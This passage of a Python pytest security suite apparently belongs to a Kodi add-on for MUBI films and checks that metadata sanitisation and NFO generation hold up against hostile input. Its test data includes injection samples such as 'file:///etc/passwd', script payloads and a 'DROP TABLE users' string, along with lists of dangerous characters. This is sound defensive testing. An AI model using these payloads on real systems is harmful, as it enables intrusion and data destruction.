                    assert char not in sanitized_name, f"Filesystem-dangerous character '{char}' should be removed from sanitized name"

                # LEVEL 2: Verify safe characters are preserved in filenames
                level2_safe_chars = [';', '&', '$', '`', '#', '@', '!', '~', '+', '=', ',', '(', ')', "'"]
                # Note: Some safe chars might not appear in test payloads, so we don't assert their presence

                # Test NFO generation doesn't execute commands
                nfo_content = film._get_nfo_tree(
                    metadata,
                    "http://example.com/trailer",
                    "http://imdb.com/title/tt123456",
                    None
                )

                assert nfo_content is not None, f"NFO generation should handle command injection in {field}"

                # Convert bytes to string if necessary
                nfo_content = self._ensure_string(nfo_content)

                # LEVEL 2: NFO content preserves original titles with normal punctuation
                # Level 2 only removes control characters from NFO, preserves movie title characters
                # Verify NFO is valid XML (ElementTree handles XML escaping automatically)
                assert '<movie>' in nfo_content, "NFO should be valid XML"
                assert '</movie>' in nfo_content, "NFO should be properly closed"

                # LEVEL 2: Verify no control characters in NFO (security)
                for i in range(32):
                    if i not in [9, 10, 13]:  # Allow tab, LF, CR
                        assert chr(i) not in nfo_content, f"Control character {i} should be removed"

    @patch('xbmc.log')
    def test_buffer_overflow_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of buffer overflow attacks with extremely long metadata input.

        Validates that long strings in metadata are handled safely without crashes.
        """
        # Arrange
        buffer_payloads = malicious_payloads['buffer_overflow']

        for payload in buffer_payloads:
            # Test each text field with extremely long content
            for field in ['title', 'plot', 'plotoutline', 'castandrole']:
                metadata_args = safe_metadata_template.copy()
                metadata_args[field] = payload

                # Act & Assert - Should not crash or raise exceptions
                try:
                    metadata = Metadata(**metadata_args)
                    film = Film(
                        mubi_id='security_test_buffer',
                        title='Security Test',
                        artwork='http://example.com/art.jpg',
                        web_url='http://example.com/movie',
                        metadata=metadata
                    )

                    # Test NFO generation with long content
                    nfo_content = film._get_nfo_tree(
                        metadata,
                        "http://example.com/trailer",
                        "http://imdb.com/title/tt123456",
                        None
                    )

                    # Assert
                    assert nfo_content is not None, f"NFO generation should handle long {field} content"
                    assert len(nfo_content) > 0, f"NFO should contain content even with long {field}"

                    # Verify the content is reasonable (not just the entire payload)
                    if len(payload) > 1000:
                        # For very long payloads, ensure they don't completely dominate the NFO
                        assert len(nfo_content) < len(payload) * 2, f"NFO should not be excessively long due to {field}"

                    # Test filename sanitization with long content
                    sanitized_name = film.get_sanitized_folder_name()
                    assert sanitized_name is not None, f"Filename sanitization should handle long {field}"
                    assert len(sanitized_name) < 255, f"Sanitized filename should be reasonable length for {field}"

                except Exception as e:
                    pytest.fail(f"Buffer overflow test failed for {field} with payload length {len(payload)}: {str(e)}")

    @patch('xbmc.log')
    def test_unicode_attack_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of Unicode-based attacks and encoding issues in metadata.

        Validates that Unicode control characters and special sequences are handled safely.
        """
        # Arrange
        unicode_payloads = malicious_payloads['unicode_attacks']

        for payload in unicode_payloads:
            # Test each text field with malicious Unicode
            for field in ['title', 'originaltitle', 'plot', 'castandrole']:
                metadata_args = safe_metadata_template.copy()
                metadata_args[field] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_unicode',
                    title='Security Test',
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                # Test filename sanitization with Unicode
                sanitized_name = film.get_sanitized_folder_name()

                # Assert
                assert sanitized_name is not None, f"Unicode handling should not fail for {field}"
                assert len(sanitized_name) > 0, f"Sanitized name should not be empty for {field}"

                # Verify dangerous Unicode characters are handled
                # Control characters should be removed
                for i in range(32):  # ASCII control characters
                    if i not in [9, 10, 13]:  # Allow tab, LF, CR
                        assert chr(i) not in sanitized_name, f"Control character {i} should be removed"

                # Verify specific Unicode attacks are neutralized
                assert '\u202e' not in sanitized_name, "Right-to-left override should be removed"
                assert '\ufeff' not in sanitized_name, "BOM should be removed"
                assert '\u200b' not in sanitized_name, "Zero-width space should be removed"

                # Test NFO generation with Unicode
                nfo_content = film._get_nfo_tree(
                    metadata,
                    "http://example.com/trailer",
                    "http://imdb.com/title/tt123456",
                    None
                )

                assert nfo_content is not None, f"NFO generation should handle Unicode in {field}"

                # Convert bytes to string if necessary
                nfo_content = self._ensure_string(nfo_content)

                # Verify NFO is valid XML despite Unicode content
                try:
                    import xml.etree.ElementTree as ET
                    ET.fromstring(nfo_content)
                except ET.ParseError as e:
                    # Some Unicode characters may cause XML parsing issues - this is expected
                    # and documents a potential issue with Unicode handling
                    assert nfo_content is not None, f"NFO should be generated even if XML parsing fails for {field}"

    @patch('xbmc.log')
    def test_format_string_attack_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of format string attacks in metadata processing.

        Validates that format string specifiers don't cause information disclosure.
        """
        # Arrange
        format_payloads = malicious_payloads['format_string']

        for payload in format_payloads:
            # Test each text field with format string attacks
            for field in ['title', 'plot', 'castandrole', 'originaltitle']:
                metadata_args = safe_metadata_template.copy()
                metadata_args[field] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_format',
                    title='Security Test',
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                # Test string representation (common place for format string vulnerabilities)
                str_repr = str(metadata)

                # Assert
                assert str_repr is not None, f"String representation should not fail with format strings in {field}"

                # Verify format specifiers are not interpreted
                assert '%s' not in str_repr or payload in str_repr, "Format specifiers should not be interpreted"
                assert '%x' not in str_repr or payload in str_repr, "Hex format specifiers should not be interpreted"
                assert '%n' not in str_repr or payload in str_repr, "Write format specifiers should not be interpreted"

                # Test NFO generation
                nfo_content = film._get_nfo_tree(
                    metadata,
                    "http://example.com/trailer",
                    "http://imdb.com/title/tt123456",
                    None
                )

                assert nfo_content is not None, f"NFO generation should handle format strings in {field}"

                # Convert bytes to string if necessary
                nfo_content = self._ensure_string(nfo_content)

                # Verify format specifiers in NFO are escaped/literal
                if payload in nfo_content:
                    # If the payload appears, it should be as literal text, not interpreted
                    assert nfo_content.count('%') >= payload.count('%'), "Format specifiers should appear literally"

    @patch('xbmc.log')
    def test_sql_injection_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of SQL injection attacks in metadata fields.

        Validates that SQL injection patterns are properly escaped.
        """
        # Arrange
        sql_payloads = malicious_payloads['sql_injection']

        for payload in sql_payloads:
            # Test each text field with SQL injection
            for field in ['title', 'plot', 'castandrole', 'director']:
                metadata_args = safe_metadata_template.copy()
                if field == 'director':
                    metadata_args[field] = [payload]
                else:
                    metadata_args[field] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_sql',
                    title='Security Test',
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                # Test NFO generation (where SQL-like content might be processed)
                nfo_content = film._get_nfo_tree(
                    metadata,
                    "http://example.com/trailer",
                    "http://imdb.com/title/tt123456",
                    None
                )

                # Assert
                assert nfo_content is not None, f"NFO generation should handle SQL injection in {field}"

                # Convert bytes to string if necessary
                nfo_content = self._ensure_string(nfo_content)

                # LEVEL 2: NFO content preserves original titles (SQL patterns are just text in movie titles)
                # Level 2 only removes control characters, preserves normal text content
                # Verify NFO is valid XML (ElementTree handles XML escaping automatically)
                assert '<movie>' in nfo_content, "NFO should be valid XML"
                assert '</movie>' in nfo_content, "NFO should be properly closed"

                # LEVEL 2: Verify no control characters in NFO (security)
                for i in range(32):
                    if i not in [9, 10, 13]:  # Allow tab, LF, CR
                        assert chr(i) not in nfo_content, f"Control character {i} should be removed"

                # Test filename sanitization with SQL injection
                sanitized_name = film.get_sanitized_folder_name()
                assert sanitized_name is not None, f"Filename sanitization should handle SQL injection in {field}"

                # LEVEL 2: Verify only filesystem-dangerous characters are removed from filenames
                filesystem_dangerous_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
                for char in filesystem_dangerous_chars:
                    if char in payload:  # Only check if the character was in the original payload
                        assert char not in sanitized_name, f"Filesystem-dangerous character '{char}' should be removed from filename"

    @patch('xbmc.log')
    def test_ldap_injection_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of LDAP injection attacks in metadata fields.

        Validates that LDAP injection patterns are properly handled.
        """
        # Arrange
        ldap_payloads = malicious_payloads['ldap_injection']

        for payload in ldap_payloads:
            # Test each text field with LDAP injection
            for field in ['title', 'castandrole', 'director']:
                metadata_args = safe_metadata_template.copy()
                if field == 'director':
                    metadata_args[field] = [payload]
                else:
                    metadata_args[field] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_ldap',
                    title='Security Test',
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                # Test filename sanitization with LDAP injection
                sanitized_name = film.get_sanitized_folder_name()

                # Assert
                assert sanitized_name is not None, f"Filename sanitization should handle LDAP injection in {field}"

                # Verify LDAP injection characters are removed
                # NOTE: Current implementation allows () as they are safe in filenames
                dangerous_ldap_chars = ['*', '\\', '/', '+', '<', '>', ';', '"', '=', ',']
                for char in dangerous_ldap_chars:
                    assert char not in sanitized_name, f"LDAP character '{char}' should be removed from filename"

                # Test NFO generation
                nfo_content = film._get_nfo_tree(
                    metadata,
                    "http://example.com/trailer",
                    "http://imdb.com/title/tt123456",
                    None
                )

                assert nfo_content is not None, f"NFO generation should handle LDAP injection in {field}"

    @patch('xbmc.log')
    def test_metadata_input_validation_comprehensive(self, mock_log, safe_metadata_template):
        """
        Test comprehensive input validation for metadata fields.

        Validates that all metadata fields properly validate and sanitize input.
        """
        # Arrange
        dangerous_inputs = [
            None,  # Null input
            "",    # Empty string
            " " * 1000,  # Whitespace only
            "\x00\x01\x02",  # Binary data
            "<?xml version='1.0'?><root/>",  # XML content
            "javascript:alert(1)",  # JavaScript URL
            "data:text/html,<script>alert(1)</script>",  # Data URL
            "file:///etc/passwd",  # File URL
            "\\\\server\\share\\file",  # UNC path
            "CON", "PRN", "AUX", "NUL",  # Windows reserved names
        ]

        for dangerous_input in dangerous_inputs:
            # Test each field with dangerous input
            for field in ['plot', 'plotoutline', 'originaltitle', 'castandrole']:  # Skip title for None test
                metadata_args = safe_metadata_template.copy()

                # Skip None test for required fields
                if dangerous_input is None and field == 'title':
                    continue

                metadata_args[field] = dangerous_input

                # Act & Assert - Should not crash
                try:
                    metadata = Metadata(**metadata_args)
                    film = Film(
                        mubi_id='security_test_validation',
                        title='Security Test',
                        artwork='http://example.com/art.jpg',
                        web_url='http://example.com/movie',
                        metadata=metadata
                    )

                    # Test that operations complete safely
                    sanitized_name = film.get_sanitized_folder_name()
                    assert sanitized_name is not None, f"Sanitization should handle dangerous input in {field}"

                    if dangerous_input in ["CON", "PRN", "AUX", "NUL"]:
                        # Windows reserved names should be modified
                        assert sanitized_name.upper() not in ["CON", "PRN", "AUX", "NUL"], f"Reserved name {dangerous_input} should be modified"

                    # NFO generation should also complete safely
                    nfo_content = film._get_nfo_tree(
                        metadata,
                        "http://example.com/trailer",
                        "http://imdb.com/title/tt123456",
                        None
                    )
                    assert nfo_content is not None, f"NFO generation should handle dangerous input in {field}"

                except Exception as e:
                    pytest.fail(f"Input validation failed for {field} with input {repr(dangerous_input)}: {str(e)}")

    @patch('xbmc.log')
    def test_metadata_security_edge_cases(self, mock_log, safe_metadata_template):
        """
        Test security edge cases in metadata handling.

        Validates handling of unusual but potentially dangerous scenarios.
        """
        # Arrange
        edge_cases = [
            # Mixed attack vectors
            "<script>alert('XSS')</script>'; DROP TABLE users; --",
            # Nested encoding
            "%253Cscript%253Ealert(1)%253C/script%253E",
            # Unicode normalization attacks
            "\u0041\u0300",  # A with combining grave accent
            # Homograph attacks
            "аdmin",  # Cyrillic 'а' instead of Latin 'a'
            # Zero-width attacks
            "admin\u200Buser",
            # Overlong UTF-8 sequences (conceptual)
            "\xC0\xAF",
        ]

        for edge_case in edge_cases:
            # Test with title field (most commonly used)
            metadata_args = safe_metadata_template.copy()
            metadata_args['title'] = edge_case

            # Act
            metadata = Metadata(**metadata_args)
            film = Film(
                mubi_id='security_test_edge',
                title='Security Test',
                artwork='http://example.com/art.jpg',
                web_url='http://example.com/movie',
                metadata=metadata
            )

            # Assert
            sanitized_name = film.get_sanitized_folder_name()
            assert sanitized_name is not None, f"Should handle edge case: {repr(edge_case)}"

            # Verify no dangerous patterns remain
            assert '<script>' not in sanitized_name.lower(), "Script tags should be removed"
            assert 'drop table' not in sanitized_name.lower(), "SQL commands should be removed"
            assert '\u200B' not in sanitized_name, "Zero-width characters should be removed"

            # NFO generation should also be safe
            nfo_content = film._get_nfo_tree(
                metadata,
                "http://example.com/trailer",
                "http://imdb.com/title/tt123456",
                None
            )
            assert nfo_content is not None, f"NFO generation should handle edge case: {repr(edge_case)}"
